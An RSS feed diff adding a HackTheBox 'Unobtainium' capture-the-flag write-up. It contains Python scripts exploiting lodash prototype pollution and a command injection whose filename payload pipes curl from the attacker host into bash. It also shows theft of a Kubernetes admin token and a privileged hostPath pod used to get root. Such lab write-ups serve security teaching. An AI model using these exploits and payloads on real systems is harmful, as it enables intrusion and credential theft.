@@ -33,6 +33,411 @@
     </item>
     
     <item>
+      <title>HackTheBox - Unobtainium Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-unobtainium/</link>
+      <pubDate>Sat, 04 Sep 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-unobtainium/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.235 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Discovered open port 80/tcp on 10.10.10.235
+Discovered open port 22/tcp on 10.10.10.235
+Discovered open port 31337/tcp on 10.10.10.235
+Discovered open port 8443/tcp on 10.10.10.235
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;Nothing really interesting except for the 3 downloadable files!&lt;/p&gt;
+&lt;img src=&#34;web.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s get the deb one!
+&lt;img src=&#34;zip.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s now extract the files inside the .deb file that we got&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dpkg-deb -xv unobtainium_1.0.0_amd64.deb writeup
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;extract.png&#34;&gt;
+&lt;p&gt;Inside ./opt/unobtainium/ we can find an executable&lt;/p&gt;
+&lt;img src=&#34;exec.png&#34;&gt;
+&lt;p&gt;We can solve this error by adding &lt;code&gt;unobtainium.htb&lt;/code&gt; to our /etc/hosts file&lt;/p&gt;
+&lt;img src=&#34;exec1.png&#34;&gt;
+&lt;p&gt;Nothing really interesting in the logs except of finding a potential username &lt;code&gt;felamos&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;exec2.png&#34;&gt;
+&lt;p&gt;We can also Post messages, let&amp;rsquo;s try to capture the traffic with wireshark when sending a message&lt;/p&gt;
+&lt;img src=&#34;wireshark.png&#34;&gt;
+&lt;p&gt;We already capture some data even before sending any thing, which seems odd&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s check what he have&lt;/p&gt;
+&lt;img src=&#34;wire1.png&#34;&gt;
+&lt;img src=&#34;wire2.png&#34;&gt;
+&lt;p&gt;Very interesting! we get creds&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;felamos:Winter2021
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And also we can see that there is a potential LFI! Let&amp;rsquo;s try to abuse it&lt;/p&gt;
+&lt;p&gt;After trying few commun files &lt;code&gt;index.js&lt;/code&gt; gave me something&lt;/p&gt;
+&lt;img src=&#34;ind.png&#34;&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var root = require(&amp;quot;google-cloudstorage-commands&amp;quot;);
+const express = require(&#39;express&#39;);
+const { exec } = require(&amp;quot;child_process&amp;quot;);     
+const bodyParser = require(&#39;body-parser&#39;);     
+const _ = require(&#39;lodash&#39;);                                                                  
+const app = express();
+var fs = require(&#39;fs&#39;);
+
+const users = [                                                                               
+  {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},
+  {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},      
+  ];
+
+let messages = [];                             
+let lastId = 1;                                
+
+function findUser(auth) {                                                                     
+  return users.find((u) =&amp;gt;                                                                    
+    u.name === auth.name &amp;amp;&amp;amp;                                                                   
+    u.password === auth.password);                                                            
+    }                                    
+
+app.use(bodyParser.json());                                                                   
+
+app.get(&#39;/&#39;, (req, res) =&amp;gt; {                   
+  res.send(messages);                                                                         
+  });                                                                                           
+
+app.put(&#39;/&#39;, (req, res) =&amp;gt; {   
+  const user = findUser(req.body.auth || {});                                                 
+
+  if (!user) {                                 
+    res.status(403).send({ok: false, error: &#39;Access denied&#39;});                                
+    return;
+  }
+
+  const message = {
+    icon: &#39;__&#39;,
+  };
+
+  _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+  });
+
+  messages.push(message);
+  res.send({ok: true});
+  });
+
+app.delete(&#39;/&#39;, (req, res) =&amp;gt; {
+  const user = findUser(req.body.auth || {});
+
+  if (!user || !user.canDelete) {
+    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+    return;
+  }
+
+  messages = messages.filter((m) =&amp;gt; m.id !== req.body.messageId);
+  res.send({ok: true});
+  });
+app.post(&#39;/upload&#39;, (req, res) =&amp;gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+    return;
+  }
+
+
+  filename = req.body.filename;
+  root.upload(&amp;quot;./&amp;quot;,filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+  });
+
+app.post(&#39;/todo&#39;, (req, res) =&amp;gt; {
+    const user = findUser(req.body.auth || {});
+    if (!user) {
+        res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+        return;
+    }
+
+    filename = req.body.filename;
+        testFolder = &amp;quot;/usr/src/app&amp;quot;;
+        fs.readdirSync(testFolder).forEach(file =&amp;gt; {
+                if (file.indexOf(filename) &amp;gt; -1) {
+                        var buffer = fs.readFileSync(filename).toString();
+                        res.send({ok: true, content: buffer});
+                }
+        });
+        });
+
+app.listen(3000);
+console.log(&#39;Listening on port 3000...&#39;);
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can also get &lt;code&gt;package.json&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
+  &amp;quot;name&amp;quot;: &amp;quot;Unobtainium-Server&amp;quot;,
+  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
+  &amp;quot;description&amp;quot;: &amp;quot;API Service for Electron client&amp;quot;,
+  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
+  &amp;quot;scripts&amp;quot;: {
+    &amp;quot;start&amp;quot;: &amp;quot;node index.js&amp;quot;
+  },
+  &amp;quot;author&amp;quot;: &amp;quot;felamos&amp;quot;,
+  &amp;quot;license&amp;quot;: &amp;quot;ISC&amp;quot;,
+  &amp;quot;dependencies&amp;quot;: {
+    &amp;quot;body-parser&amp;quot;: &amp;quot;1.18.3&amp;quot;,
+    &amp;quot;express&amp;quot;: &amp;quot;4.16.4&amp;quot;,
+    &amp;quot;lodash&amp;quot;: &amp;quot;4.17.4&amp;quot;,
+    &amp;quot;google-cloudstorage-commands&amp;quot;: &amp;quot;0.0.1&amp;quot;
+  },
+  &amp;quot;devDependencies&amp;quot;: {}
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is an interesting /upload endpoint, let&amp;rsquo;s try if we can upload anything! but sadly that didn&amp;rsquo;t work, we didn&amp;rsquo;t have permessions&lt;/p&gt;
+&lt;p&gt;After searching a bit we can find that loadsh 4.17.4 is vulnerable to Prototype Pollution&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://snyk.io/test/npm/lodash/4.17.4&#34;&gt;https://snyk.io/test/npm/lodash/4.17.4&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And also google-cloudstorage-commands is vulnerable to RCE&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&#34;&gt;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The next step to do now is pretty straightforward after knowing these 2 exploits!&lt;/p&gt;
+&lt;p&gt;The /upload endpoint is what we&amp;rsquo;ll be looking for now! It will be enough to get us into the machine&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;
+app.post(&#39;/upload&#39;, (req, res) =&amp;gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: &#39;Access denied&#39;});
+    return;
+  }
+
+
+  filename = req.body.filename;
+  root.upload(\&amp;quot;./\&amp;quot;,filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+  });
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;First we need to pollute &lt;code&gt;canUpload&lt;/code&gt; and changes its value to &lt;code&gt;true&lt;/code&gt;. here a little python script to do it&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+headers = {
+    &#39;content-type&#39;: &#39;application/json&#39;,
+}
+
+data = &#39;{&amp;quot;auth&amp;quot;: {&amp;quot;name&amp;quot;: &amp;quot;felamos&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;Winter2021&amp;quot;}, &amp;quot;message&amp;quot;: {&amp;quot;__proto__&amp;quot;:{canUpload&amp;quot;:true}}}&#39;
+
+response = requests.put(&#39;http://unobtainium.htb:31337/&#39;, headers=headers, data=data)
+print(response.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;pollute.png&#34;&gt;
+Looks like it worked!!
+&lt;p&gt;Now all we need to do is upload a filename which is our payload!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=&amp;quot;&amp;amp; PAYLOAD&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;rce.png&#34;&gt;
+&lt;p&gt;Here&amp;rsquo;s a python script to do it&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+headers = {
+    &#39;Host&#39;: &#39;unobtainium.htb:31337&#39;,
+    &#39;Connection&#39;: &#39;keep-alive&#39;,
+    &#39;Content-Length&#39;: &#39;90&#39;,
+    &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36&#39;,
+    &#39;Content-Type&#39;: &#39;application/json&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+    &#39;Accept-Language&#39;: &#39;en-US&#39;,
+}
+
+data = &#39;{\\&amp;quot;auth\\&amp;quot;:{\\&amp;quot;name\\&amp;quot;:\\&amp;quot;felamos\\&amp;quot;,\\&amp;quot;password\\&amp;quot;:\\&amp;quot;Winter2021\\&amp;quot;},\\&amp;quot;filename\\&amp;quot;:\\&amp;quot;&amp;amp; curl 10.10.14.37:8000/x|bash\\&amp;quot;}&#39;
+
+response = requests.post(&#39;http://unobtainium.htb:31337/upload&#39;, headers=headers, data=data, verify=False)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Running linpeas we can see that we&amp;rsquo;re in a container&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[+] Is this a container? ........... Looks like we&#39;re in a Docker container
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Also a weird crontab that&amp;rsquo;s looking for the kubectl binary on the system and deletes it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;* * * * * find / -name kubectl -exec rm {} \;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;we can eaisly bypass this by changing the name of the binary&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Which is  the Kubernetes CLI tool that can enumerate and run commands against kubernetes clusters!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s get that binary into the box and start enumerating with it&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Following any kubectl cheatcheet can do the trick!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s find start by getting the namespaces&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc get namespaces
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;ns.png&#34;&gt;
+&lt;p&gt;The interesting one is dev!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s now list the pods in the dev namespace&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc get pods -n dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;pods.png&#34;&gt;
+&lt;p&gt;There is now an interesting feature which is describe which can give us almost all the informations we need&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Name:         devnode-deployment-cd86fb5c-6ms8d
+Namespace:    dev
+Priority:     0
+Node:         unobtainium/10.10.10.235
+Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
+Labels:       app=devnode
+              pod-template-hash=cd86fb5c
+Annotations:  &amp;lt;none&amp;gt;
+Status:       Running
+IP:           172.17.0.5
+IPs:
+  IP:           172.17.0.5
+Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
+Containers:
+  devnode:
+    Container ID:   docker://27a4149a9c4cc6730f21a43124b0ac8fa67eed9a7934cab4f9d95a30d1878e38
+    Image:          localhost:5000/node_server
+    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
+    Port:           3000/TCP
+    Host Port:      0/TCP
+    State:          Running
+      Started:      Fri, 03 Sep 2021 05:08:42 +0000
+    Last State:     Terminated
+      Reason:       Error
+      Exit Code:    137
+      Started:      Mon, 26 Jul 2021 15:00:22 +0000
+      Finished:     Mon, 26 Jul 2021 15:04:55 +0000
+    Ready:          True
+    Restart Count:  30
+    Environment:    &amp;lt;none&amp;gt;
+    Mounts:
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
+Conditions:
+  Type              Status
+  Initialized       True 
+  Ready             True 
+  ContainersReady   True 
+  PodScheduled      True 
+Volumes:
+  default-token-rmcd6:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-rmcd6
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &amp;lt;none&amp;gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:          &amp;lt;none&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like the pod is running on 172.17.0.5:3000&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s fordward it to our box&lt;/p&gt;
+&lt;img src=&#34;forward.png&#34;&gt;
+&lt;p&gt;Since we know that it&amp;rsquo;s vulnerable to loadsh and we can turn it into an RCE! we&amp;rsquo;ll be doing the same steps that we did for the foothold&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+headers = {
+    &#39;content-type&#39;: &#39;application/json&#39;,
+}
+
+data = &#39;{&amp;quot;auth&amp;quot;: {&amp;quot;name&amp;quot;: &amp;quot;felamos&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;Winter2021&amp;quot;}, &amp;quot;message&amp;quot;: {&amp;quot;__proto__&amp;quot;:{canUpload&amp;quot;:true}}}&#39;
+
+response = requests.put(&#39;http://localhost:9090/&#39;, headers=headers, data=data)
+print(response.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+headers = {
+    &#39;Host&#39;: &#39;localhost:9090&#39;,
+    &#39;Connection&#39;: &#39;keep-alive&#39;,
+    &#39;Content-Length&#39;: &#39;90&#39;,
+    &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36&#39;,
+    &#39;Content-Type&#39;: &#39;application/json&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+    &#39;Accept-Language&#39;: &#39;en-US&#39;,
+}
+
+data = &#39;{\\&amp;quot;auth\\&amp;quot;:{\\&amp;quot;name\\&amp;quot;:\\&amp;quot;felamos\\&amp;quot;,\\&amp;quot;password\\&amp;quot;:\\&amp;quot;Winter2021\\&amp;quot;},\\&amp;quot;filename\\&amp;quot;:\\&amp;quot;&amp;amp; curl 10.10.14.37:8000/x|bash\\&amp;quot;}&#39;
+
+response = requests.post(&#39;http://localhost:9090/upload&#39;, headers=headers, data=data, verify=False,proxies={&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;})
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;node.png&#34;&gt;
+&lt;p&gt;and we get a shell in devnode&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s try if we can list secrets of the namespace kube-system&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc auth can-i list secrets -n kube-system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;secret.png&#34;&gt;
+&lt;p&gt;now let&amp;rsquo;s get them&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc get secrets -n kube-system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;root@devnode-deployment-cd86fb5c-6ms8d:~/.euch# ./kc get secrets -n kube-system
+
+NAME                                             TYPE                                  DATA   AGE
+attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      230d
+bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      230d
+c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      229d
+certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      230d
+..&amp;lt;snip&amp;gt;..
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;c-admin-token-tfmp2&lt;/code&gt; is the interesting one which will give us the administrator token&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc describe secrets/c-admin-token-tfmp2 -n kube-system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;token.png&#34;&gt;
+&lt;pre&gt;&lt;code&gt;eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now it&amp;rsquo;s pretty much over!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&#34;&gt;https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The only think left to check is if we&amp;rsquo;re able to create pods&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc --token=&amp;lt;token&amp;gt; auth can-i create pod
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;bad.png&#34;&gt;
+&lt;p&gt;now we can use badpod as mentioned in the article&lt;/p&gt;
+&lt;p&gt;our yaml payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: localhost:5000/dev-alpine
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;--&amp;quot; ]
+    args: [ &amp;quot;while true; do sleep 30; done;&amp;quot; ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s create the pod&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc create -f root.yaml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And let&amp;rsquo;s now get a root shell on the host&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./kc --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow exec -it everything-allowed-exec-pod -- chroot /host bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;root.png&#34;&gt;
+&lt;p&gt;And we rooted the machine!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HackTheBox - Breadcrumbs Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/htb-breadcrumbs/</link>
       <pubDate>Sat, 17 Jul 2021 00:00:00 +0000</pubDate>
